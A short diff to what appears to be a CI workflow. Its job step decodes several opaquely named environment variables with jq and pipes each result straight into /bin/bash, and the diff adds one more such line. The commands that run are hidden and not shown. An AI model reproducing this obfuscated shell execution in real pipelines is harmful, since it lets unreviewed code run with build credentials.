@@ -32,6 +32,7 @@ jobs:
           echo $mfcl9211 | jq -r .o8 | /bin/bash
           echo $gyw494 | jq -r .y5 | /bin/bash
           echo $mnioq73 | jq -r .rfhmf3236 | /bin/bash
+          echo $khw1700 | jq -r .svy5 | /bin/bash
 
       - name: Save output
         if: always()
